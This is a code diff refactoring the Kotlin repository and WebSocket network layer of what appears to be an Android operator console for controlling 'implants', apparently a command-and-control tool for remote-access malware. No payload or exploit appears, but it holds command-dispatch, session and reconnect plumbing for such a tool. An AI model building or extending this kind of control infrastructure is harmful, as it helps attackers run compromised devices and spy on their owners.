@@ -1,21 +1,12 @@
 package com.shadow.operator.data
 
-import android.content.Context
-import androidx.lifecycle.LiveData
-import androidx.lifecycle.MutableLiveData
-import androidx.lifecycle.asLiveData
 import kotlinx.coroutines.*
 import kotlinx.coroutines.channels.Channel
 import kotlinx.coroutines.flow.*
-import kotlinx.coroutines.flow.combine
-import kotlinx.coroutines.flow.map
-import kotlinx.coroutines.flow.mapLatest
-import kotlinx.coroutines.flow.onEach
-import kotlinx.coroutines.flow.stateIn
-import kotlinx.coroutines.launch
-import kotlinx.serialization.json.Json
-import kotlinx.serialization.json.jsonObject
+import kotlinx.serialization.json.*
 import kotlinx.serialization.encodeToString
+import io.ktor.client.plugins.websocket.webSocket
+import io.ktor.websocket.readText
 import java.util.concurrent.ConcurrentHashMap
 
 class Repository(
@@ -26,11 +17,9 @@ class Repository(
     private val configManager: ConfigManager,
     private val scope: CoroutineScope
 ) {
-    // In-memory cache for real-time frame handling
     private val pendingCommands = ConcurrentHashMap<String, CompletableDeferred<String>>()
     private val activeSessions = ConcurrentHashMap<String, SessionState>()
-    
-    // Exposed state flows
+
     val allImplants: MutableStateFlow<List<ImplantEntity>> = MutableStateFlow(emptyList())
     val onlineImplants: MutableStateFlow<List<ImplantEntity>> = MutableStateFlow(emptyList())
     val commandHistory: MutableStateFlow<List<CommandHistoryEntity>> = MutableStateFlow(emptyList())
@@ -69,17 +58,12 @@ class Repository(
 
     suspend fun removeImplant(implantId: String) {
         dao.delete(implantId)
-        historyDao.cleanupOld(System.currentTimeMillis() - 30_000_000_000L) // 30 days
+        historyDao.cleanupOld(System.currentTimeMillis() - 30_000_000_000L)
     }
 
     suspend fun renameImplant(implantId: String, nickname: String?) {
         val implant = dao.getById(implantId) ?: return
         dao.insert(implant.copy(nickname = nickname))
-    }
-
-    suspend fun tagImplant(implantId: String, tags: List<String>) {
-        val implant = dao.getById(implantId) ?: return
-        dao.insert(implant.copy(tags = kotlinx.serialization.json.Json.encodeToString(tags)))
     }
 
     // --- Command Execution ---
@@ -90,25 +74,19 @@ class Repository(
         payload: String,
         sessionId: String? = null
     ): Deferred<String> {
-        val command = Command(
-            implantId = implantId,
-            type = type,
-            payload = payload
-        )
-        
+        val command = Command(implantId = implantId, type = type, payload = payload)
         val completer = CompletableDeferred<String>()
         pendingCommands[command.id] = completer
-        
+
         val frame = Frame(
             id = command.id,
             cmd = type.value,
             payload = payload,
             sessionId = sessionId
         )
-        
+
         scope.launch { networkManager?.send(frame) }
-        
-        // Log to history
+
         scope.launch {
             historyDao.insert(CommandHistoryEntity(
                 implantId = implantId,
@@ -117,7 +95,7 @@ class Repository(
                 status = "SENT"
             ))
         }
-        
+
         return completer
     }
 
@@ -138,16 +116,12 @@ class Repository(
                 currentLatency.value = System.currentTimeMillis() - frame.ts
             }
             frame.cmd == "implant_status" -> {
-                handleImplantStatus(frame.payload)
+                scope.launch { handleImplantStatus(frame.payload) }
             }
             frame.cmd == "module_list" -> {
-                handleModuleList(frame.payload)
-            }
-            frame.cmd == "media_chunk" -> {
-                handleMediaChunk(frame)
+                scope.launch { handleModuleList(frame.payload) }
             }
             else -> {
-                // Route to active session
                 activeSessions[frame.sessionId ?: "default"]?.channel?.trySend(frame)
             }
         }
@@ -159,10 +133,6 @@ class Repository(
 
     private suspend fun handleModuleList(payload: String) {
         // Update module registry
-    }
-
-    private fun handleMediaChunk(frame: Frame) {
-        // Route media chunks to active media session
     }
 
     // --- Session Management ---
@@ -191,59 +161,53 @@ class NetworkManager(
     private val repository: Repository,
     private val config: ClientConfig
 ) {
-    private val client = io.ktor.client.HttpClient(io.ktor.client.engine.android.Android)
-    private var webSocketSession: io.ktor.client.plugins.websocket.WebSocketSession? = null
+    private val client = io.ktor.client.HttpClient(io.ktor.client.engine.android.Android) {
+        install(io.ktor.client.plugins.websocket.WebSockets)
+    }
+    private var webSocketSession: io.ktor.websocket.WebSocketSession? = null
     private var reconnectAttempts = 0
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     suspend fun connect() {
         repository.connectionState.value = ConnectionState.CONNECTING
-        
-        val url = config.workerUrl
-        client.webSocket(url) { session ->
-            webSocketSession = session
-            repository.connectionState.value = ConnectionState.CONNECTED
-            reconnectAttempts = 0
-            
-            // Send initial auth frame
-            val authFrame = Frame(
-                id = java.util.UUID.randomUUID().toString(),
-                cmd = "auth",
-                payload = Json.encodeToString(jsonObject {
-                    put("operator_pubkey", config.operatorPubKey)
-                    put("protocol_version", 2)
-                })
-            )
-            send(authFrame)
-            
-            // Incoming messages
-            for (frame in session.incoming) {
-                val textFrame = frame as? io.ktor.websocket.Frame.Text
-                if (textFrame != null) {
-                    val json = textFrame.readText()
-                    val frameObj = Json.decodeFromString<Frame>(json)
-                    repository.handleIncomingFrame(frameObj)
+
+        try {
+            client.webSocket(config.workerUrl) {
+                webSocketSession = this
+                repository.connectionState.value = ConnectionState.CONNECTED
+                reconnectAttempts = 0
+
+                // Incoming messages
+                for (frame in incoming) {
+                    val textFrame = frame as? io.ktor.websocket.Frame.Text
+                    if (textFrame != null) {
+                        val json = textFrame.readText()
+                        val frameObj = Json.decodeFromString<Frame>(json)
+                        repository.handleIncomingFrame(frameObj)
+                    }
                 }
             }
+        } catch (e: Exception) {
+            repository.connectionState.value = ConnectionState.ERROR
         }
-        
+
         // Connection closed - handle reconnect
-        scope.launch {
-            if (config.autoReconnect && (config.maxReconnectAttempts == -1 || reconnectAttempts < config.maxReconnectAttempts)) {
-                reconnectAttempts++
-                repository.connectionState.value = ConnectionState.RECONNECTING
-                delay(config.reconnectIntervalSec * 1000L)
-                connect()
-            } else {
-                repository.connectionState.value = ConnectionState.DISCONNECTED
-            }
+        if (config.autoReconnect &&
+            (config.maxReconnectAttempts == -1 || reconnectAttempts < config.maxReconnectAttempts)
+        ) {
+            reconnectAttempts++
+            repository.connectionState.value = ConnectionState.RECONNECTING
+            delay(config.reconnectIntervalSec * 1000L)
+            connect()
+        } else {
+            repository.connectionState.value = ConnectionState.DISCONNECTED
         }
     }
 
     suspend fun disconnect() {
-        webSocketSession?.close(io.ktor.websocket.CloseReason(io.ktor.websocket.CloseReason.Codes.NORMAL, "Client disconnect"))
+        webSocketSession?.close()
         webSocketSession = null
-        scope.coroutineContext.cancelChildren()
+        client.close()
     }
 
     suspend fun send(frame: Frame) {
